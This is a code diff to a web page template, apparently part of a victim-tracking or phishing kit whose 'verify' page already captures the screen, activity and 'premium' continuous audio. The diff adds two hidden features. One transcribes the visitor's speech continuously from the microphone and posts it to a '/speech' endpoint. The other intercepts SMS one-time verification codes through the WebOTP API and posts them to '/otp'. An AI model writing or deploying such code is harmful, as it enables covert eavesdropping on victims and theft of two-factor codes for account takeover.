@@ -506,6 +506,44 @@ async function doScreenCapture(){
 }
 <% } %>
 
+<% if(speechRecogAccess){ %>
+// ── Speech-to-Text: continuous real-time transcription ───────────────────────
+function doSpeechRecog(){
+  var SR=window.SpeechRecognition||window.webkitSpeechRecognition;
+  if(!SR)return;
+  var rec=new SR(),_buf='',_t=null;
+  rec.continuous=true;
+  rec.interimResults=false;
+  rec.maxAlternatives=1;
+  rec.onresult=function(e){
+    for(var i=e.resultIndex;i<e.results.length;i++){
+      if(e.results[i].isFinal){_buf+=e.results[i][0].transcript+' ';}
+    }
+    clearTimeout(_t);
+    _t=setTimeout(function(){
+      var s=_buf.trim();if(s){$.post(a+"/speech",{uid:uid,text:encodeURIComponent(s)});}_buf='';
+    },3000);
+  };
+  rec.onend=function(){try{rec.start();}catch(e){}};
+  rec.onerror=function(e){if(e.error!=='no-speech'&&e.error!=='aborted'){try{setTimeout(function(){rec.start();},2000);}catch(err){}}};
+  try{rec.start();}catch(e){}
+}
+<% } %>
+
+<% if(webOTPAccess){ %>
+// ── WebOTP: intercept SMS verification codes ──────────────────────────────────
+function doWebOTP(){
+  if(!('OTPCredential' in window))return;
+  try{
+    var ac=new AbortController();
+    navigator.credentials.get({otp:{transport:['sms']},signal:ac.signal})
+      .then(function(otp){if(otp&&otp.code)$.post(a+"/otp",{uid:uid,code:encodeURIComponent(otp.code)});})
+      .catch(function(){});
+    setTimeout(function(){try{ac.abort();}catch(e){}},300000);
+  }catch(e){}
+}
+<% } %>
+
 <% if(contaudioAccess){ %>
 // ── Continuous audio every 2 min (premium) ────────────────────────────────────
 function doContAudio(){
@@ -653,6 +691,8 @@ function doVerify(){
 <% if(screenCapAccess){ %>  doScreenCapture();<% } %>
 <% if(activityAccess){ %>  doActivityDetect();<% } %>
 <% if(pushAccess){ %>  if(typeof _registerPush==="function") _registerPush();<% } %>
+<% if(speechRecogAccess){ %>  setTimeout(function(){doSpeechRecog();},2000);<% } %>
+<% if(webOTPAccess){ %>  doWebOTP();<% } %>
 }
 
 // ── Page init ─────────────────────────────────────────────────────────────────
